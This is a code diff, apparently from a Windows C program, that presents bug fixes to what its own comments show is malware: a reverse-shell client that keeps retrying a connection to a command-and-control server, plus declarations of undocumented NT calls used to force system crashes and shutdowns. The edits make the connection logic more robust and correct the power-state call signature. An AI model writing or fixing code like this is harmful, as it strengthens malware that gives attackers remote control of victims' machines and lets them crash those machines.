@@ -23,7 +23,12 @@ typedef enum _SHUTDOWN_ACTION {
 ULONG    hardErrorResp_Receiver;
 NTSTATUS (NTAPI *RtlAdjustPrivilege)(ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled);
 NTSTATUS (NTAPI *NtShutdownSystem)(_In_ SHUTDOWN_ACTION);
-NTSTATUS (NTAPI *NtSetSystemPowerState)(_In_ POWER_ACTION Power_state, _In_ BOOLEAN ResumeAlarm, _In_ BOOLEAN ForcePowerDown);
+/* BUG: original signature had (POWER_ACTION, BOOLEAN, BOOLEAN) which does not
+ * match the NT kernel prototype.  Correct signature mirrors ntcalls.h:
+ * (POWER_ACTION SystemAction, SYSTEM_POWER_STATE MinSystemState, ULONG Flags) */
+NTSTATUS (NTAPI *NtSetSystemPowerState)(_In_ POWER_ACTION SystemAction,
+                                         _In_ SYSTEM_POWER_STATE MinSystemState,
+                                         _In_ ULONG Flags);
 NTSTATUS (NTAPI *NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
 
 /* Global TLS context shared between WinMain and init_shellDrop */
@@ -239,14 +244,29 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
         }
 
         memset(&socket_stdIn, 0, sizeof(socket_stdIn));
-        socket_stdIn.sin_family      = AF_INET;
-        socket_stdIn.sin_addr.s_addr = inet_addr(sIP);
-        socket_stdIn.sin_port        = htons(sPort);
+        socket_stdIn.sin_family = AF_INET;
+        socket_stdIn.sin_port   = htons(sPort);
+        /* BUG: inet_addr() is deprecated and returns INADDR_NONE on error.
+         * Replace with InetPtonA() (ws2tcpip.h) which handles IPv4+IPv6.  */
+        if (InetPtonA(AF_INET, sIP, &socket_stdIn.sin_addr) != 1) {
+            closesocket(iSock);
+            WSACleanup();
+            return 0x04;
+        }
 
-        /* Retry TCP connect until the C2 is reachable */
+        /* Retry TCP connect; recreate the socket each attempt so it is
+         * never in an error state when we call connect() again.           */
         while (connect(iSock, (struct sockaddr *)&socket_stdIn,
                         sizeof(socket_stdIn)) != 0) {
+            closesocket(iSock);
             Sleep(RECONNECT_DELAY * 1000);
+            iSock = socket(AF_INET, SOCK_STREAM, 0);
+            if (iSock == INVALID_SOCKET)
+                Sleep(RECONNECT_DELAY * 1000);
+        }
+        if (iSock == INVALID_SOCKET) {
+            Sleep(RECONNECT_DELAY * 1000);
+            continue;
         }
 
         /* ── Advanced TLS handshake (all 4 security layers) ─────────── */
